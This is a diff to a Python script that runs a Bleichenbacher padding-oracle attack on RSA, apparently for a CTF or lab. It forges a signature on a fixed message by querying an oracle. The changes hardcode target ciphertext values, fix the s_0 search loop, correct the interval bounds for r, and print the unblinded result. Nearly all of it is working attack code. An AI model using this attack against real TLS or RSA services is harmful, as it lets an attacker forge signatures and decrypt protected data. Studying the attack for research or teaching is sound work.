@@ -276,7 +276,9 @@ if not args.quiet:
 print("Now Let's do the real!")
 
 msg = "This message was signed with a Bleichenbacher oracle."
-our_c = int("0001" + "ff" * (modulus_bytes - len(msg) - 3) + "00" + "".join("{:02x}".format(ord(c)) for c in msg), 16)
+# our_c = int("0001" + "ff" * (modulus_bytes - len(msg) - 3) + "00" + "".join("{:02x}".format(ord(c)) for c in msg), 16)
+# our_c = int("21ff69e988cd6ef5e274c87cd4f9ef02359a9cae4a04acb2a0ffa7516c376ddd2b943357a26cfaac44b0402fcf1bb4e3b983d2d3431ff4995f9866b88d27064640def6b3c45202fd4cc33104e2a07c19532016f336fec8438a634ce510e1ad64d6a1f200dce80d322a84754ff2e0988f21abfdb65a60facbb68f922817aa81e297d7ed96b9f708a0d7fce35bc3d35320f0dd4e812bc4d837171c3caddf8f0d399f52920cad7f29d450165d41b01360c8a81cd43a093f3b625131620ad1855fe9edd0c59eeda11ed173764a6b4644deaebe1dbe3d8f7352eb6ca667f1b324455baf14158e01c771a18f61acd15bfc56ba64954832dfe7e754e021434a995ee2ab", 16)
+our_c = int("81f96defa41c12a9bf005da87e04d8f48220f9b36f98201ca1518897d520acfd5b3268ceb81756273e2437dffe1144de34432b685904d5d02e3f4b08cf5682a424731eb9fc920e9f17044ee3d5c1540e5ae1d890174ffeecdff7e3267fb96682bc83631575a15827646a3cf67f74c441965513c5e35afd0d396eb229349a6e13ebb0131f3bc4370984a4aa7186785ec4c043982e64b2b2e7a2bec180f81cc673e228d6de66c73e43e3b8cdb95fcd8f5d8f2249c2fb174332267bd53acc1636ebd634b82f1a7c335fc464fa9bbd02989ffb751bdb87321b0fa0d28457cb84ef66d7060aae7dd8a3db877ff9caa24a64807d5d6b8fe0cdbdc80cbfc120d02c73b2", 16)
 # C = int("0001" + "ff" * (modulus_bytes - len(msg) - 3) + "00" + "".join("{:02x}".format(ord(c)) for c in msg), 16)
 # our_c = 0xB744DACEB9F82E810BF3DE28F1A0CEF757395A748A288E36DF1C8F4CE937FAAF34966B6D95D08165FD5B431B832C67AE98C963E4F377A94D60CEEB8D0CC4E6DD430F8E7392CA64173C2AEA953E4BD1FEE6AF681B3E7E424672C2BF955AD95A70BA28629205836D43FAF2571EEAA63416D1FC3F543664600F25678C0252C43F6C9E00D875737E2F9B1263A09B41D13DBCB5373F73FC03B1D5A33AF6769FEC1FAD20212B41BD9B364244DB9CEF6F8D6E883C0FF1ECDB749463715C37C36C18D8090ED1675815D22416C26661B67EBAF44AEE11D3FA600834A4B8A71941AA70CC448F0B05B332EDC506E1CB87FAAC44DC61929E0AF9EDEA4B5FF5206853150BBE40
 # our_n = 0x00c41ca6b1a4c1ee60e0491aa6a8875054298e70fa3f2f3694678f95c66a903167e6ac5f6462bc2c8e02374cf1e5a5b2a49178dc4409c044898f572cb1fdfa49ddc0324a4c05ffbdc3e3ae1adcd6125cfb0d8b37f423919165c96883177dcf652d2012e4aa7762df5ff6f06066594f6f441ec22b00652ca58102b6b8a8d482826aee8bcac1b1d2a6ac7d5732feff6a064c2c4c8f6e772717d9ea82a56032f6305a6122d0e1bac3caad47ec11eadf00009a2b3bcc7b5fb3cb13530f10bad7de89168efcfa79b569d3ba1e0ed028a1f56bd745e0236c7dbc13c1cc7572f445009eecb2370fa08549bc8d4229cd53570f3de6c6dae83c4e59f4ba1adda9c6d9fd0d3f
@@ -354,7 +356,7 @@ def floordiv(a, b):
     return a // b
 
 while True:
-  s_0 += 1
+  # s_0 += 1
   print ("searching s_0...",s_0)
   c_d = (our_c * pow(s_0,e,N)) % N
   c = int(c_d).to_bytes(modulus_bytes, byteorder="big")
@@ -368,7 +370,7 @@ while True:
       break
     else:
       print ("no...")
-
+  s_0 += 1
 set_m_old = {(B2, B3 - 1)}
 i = 1
 # s_old = 37294 # recorded value
@@ -465,11 +467,11 @@ while True:
 
         set_m_new = set()
         for a, b in set_m_old:
-            # r_min = ceildiv(a * s_new - B3 + 1, n)
-            # r_max = floordiv(b * s_new - B2, n)
+            r_min = ceildiv(a * s_new - B3 + 1, n)
+            r_max = floordiv(b * s_new - B2, n)
 
-            r_max = (b * s_new - 2 * B) // n
-            r_min = (a * s_new - 3 * B + 1) // n
+            # r_max = (b * s_new - 2 * B) // n
+            # r_min = (a * s_new - 3 * B + 1) // n
             print("Found new values for r and a = {}, b = {} -- {} <= r <= {}".format(a, b, r_min, r_max))
 
             for r in interval(r_min, r_max+1):
@@ -499,6 +501,8 @@ while True:
                 #print("Original:   ", hex(m))
                 print("Calculated: ", hex(a))
                 print("Integer = ", a)
+                print("s0 = ", s_0)
+                print("maybe ->", (a*modinv(s_0,N)) % N)
                 print("Success after {} calls to the oracle.".format(ct))
                 exit(0)
 
